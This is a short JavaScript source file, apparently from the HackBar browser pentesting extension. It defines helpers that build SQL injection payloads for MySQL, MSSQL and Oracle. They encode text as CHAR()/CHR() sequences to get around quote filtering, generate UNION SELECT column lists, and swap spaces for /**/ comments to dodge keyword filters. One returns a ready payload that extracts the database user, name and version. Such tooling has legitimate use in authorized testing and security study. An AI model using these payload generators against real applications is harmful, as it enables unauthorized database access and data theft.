SQL = {

  selectionToSQLChar: function ( dbEngine, txt )
  {
    var charStringArray = new Array();
    var decimal;
    for ( var c = 0 ; c < txt.length ; c++ ) {
      decimal = txt.charCodeAt( c );
      charStringArray.push( decimal );
    }

    var charString = '';

    switch ( dbEngine )
    {
      case "mysql":
        charString = 'CHAR(' + charStringArray.join(', ') + ')';
        break;
      case "mssql":
        charString = ' CHAR(' + charStringArray.join(') + CHAR(') + ')';
        break;
      case "oracle":
        charString = ' CHR(' + charStringArray.join(') || CHR(') + ')';
        break;
    }
    return charString;
  },

  selectionToUnionSelect: function ( encoding )
  {
    var columns = prompt( "Amount of columns to use in the UNION SELECT Statement", "10" );
    columns = Math.min(1000, parseInt( columns ));
    var colArray = new Array();
    for ( var i = 0 ; i < columns ; i++ ) {
      colArray.push( i+1 );
    }
    var txt = "UNION SELECT " + colArray.join( ',' );
    return txt;
  },
  
  selectionToInlineComments: function (txt)
  {
    txt = txt.replace(/ /g, "/**/");
    return txt;
  },
  /* GENERAL FUNCTIONS */

  /* MYSQL FUNCTIONS */
  selectionMySQLConvertUsing: function ( encoding )
  {
    var txt = hackBar.getSelectedText();
    txt = "CONVERT(" + txt + " USING " + encoding + ")";
    return txt;
  },

  selectionMySQLBasicInfo: function ()
  {
    return "CONCAT_WS(CHAR(32,58,32),user(),database(),version())";
  }
  /* MYSQL FUNCTIONS */
}